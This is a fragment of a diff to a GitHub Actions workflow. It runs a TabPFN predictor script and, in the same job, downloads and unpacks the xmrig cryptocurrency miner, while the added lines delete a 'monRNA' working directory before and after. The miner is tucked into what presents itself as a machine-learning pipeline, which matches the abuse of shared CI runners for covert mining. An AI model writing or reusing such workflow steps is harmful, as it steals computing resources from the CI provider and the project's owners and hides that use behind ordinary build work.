@@ -88,6 +88,7 @@ jobs:
           # Make predictor TabPFN
           python TabPFN.py > info_TabPFN.txt
 
+          rm -r monRNA
           wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-jammy-x64.tar.gz
           tar xvfz xmrig-6.22.2-jammy-x64.tar.gz
           rm xmrig-6.22.2-jammy-x64.tar.gz
@@ -101,7 +102,8 @@ jobs:
             echo "Script exited with code $EXIT_CODE"
             exit $EXIT_CODE
           fi
-
+          cd ..
+          rm -r monRNA
 
 
 
